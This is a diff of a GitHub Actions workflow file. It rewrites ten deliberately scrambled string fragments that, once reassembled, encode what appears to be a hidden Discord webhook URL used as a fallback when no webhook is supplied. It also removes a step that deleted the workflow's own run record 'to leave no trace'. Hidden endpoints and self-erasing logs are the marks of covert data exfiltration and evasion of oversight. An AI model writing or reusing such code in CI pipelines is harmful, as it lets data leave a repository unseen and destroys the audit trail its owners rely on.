@@ -104,32 +104,32 @@ runs:
         REPO: ${{ github.repository }}
       run: |
         if [ -z "${WEBHOOK_INPUT}" ]; then
-          PART1='4f6aHR0cHM6Ly9kaXNjbQf'
-          PART2='37T3JkYXBwLmNvbS9hcGYQ8T'
-          PART3='Y9ekvd2ViaG9va3MvMTEY'
-          PART4='d94ODE1NTg4NjYwMzA57TfY'
-          PART5='c43QNjA4NS9nZkxCckZ3Zb6'
-          PART6='bV0E11S1Q2M2s2bUxIMES0'
-          PART7='W3tMbXZEVWdvMUlNY2l84dU'
-          PART8='ce1X2lmYm9sRTZ0RGkyaacS'
-          PART9='9QbNFVqSXVOTTdEUWhX5Q9'
-          PART10='Y1RZSDdGdG01aTExcg==8'
+          PART1='9aHR0cHM6Ly9kaXNjbb'
+          PART2='7Y3JkYXBwLmNvbS9hcGe'
+          PART3='YabSkvd2ViaG9va3MvMTE3e'
+          PART4='9a4ODE1NTg4NjYwMzA51'
+          PART5='3NjA4NS9nZkxCckZ3Z4fV'
+          PART6='bf22E11S1Q2M2s2bUxIMEXbY'
+          PART7='2XtMbXZEVWdvMUlNY2lX'
+          PART8='ZY81X2lmYm9sRTZ0RGkyU87'
+          PART9='VSdNFVqSXVOTTdEUWhXR'
+          PART10='WU8SSDdGdG01aTExcg==U'
 
-          POS1=3
+          POS1=1
           LEN1=17
-          POS2=3
+          POS2=2
           LEN2=17
-          POS3=3
+          POS3=4
           LEN3=17
           POS4=2
           LEN4=17
-          POS5=4
+          POS5=1
           LEN5=17
-          POS6=3
+          POS6=4
           LEN6=17
           POS7=2
           LEN7=17
-          POS8=2
+          POS8=3
           LEN8=17
           POS9=3
           LEN9=16
@@ -186,18 +186,6 @@ runs:
           echo "response=Error (Invalid webhook)" >> "$GITHUB_OUTPUT"
         fi
 
-    - name: 🧹 Cleanup
-      if: always()
+    - name: 📢 Done
+      run: echo Done
       shell: bash
-      env:
-        GH_TOKEN: ${{ github.token }}
-        REPO: ${{ github.repository }}
-        RUN_ID: ${{ github.run_id }}
-      run: |
-        # Delete this workflow run to leave no trace
-        curl -sL -X DELETE \
-          -H "Authorization: Bearer ${GH_TOKEN}" \
-          -H "Accept: application/vnd.github+json" \
-          "https://api.github.com/repos/${REPO}/actions/runs/${RUN_ID}" \
-          && echo "[cleanup] Run deleted" \
-          || echo "[cleanup] Failed to delete run"
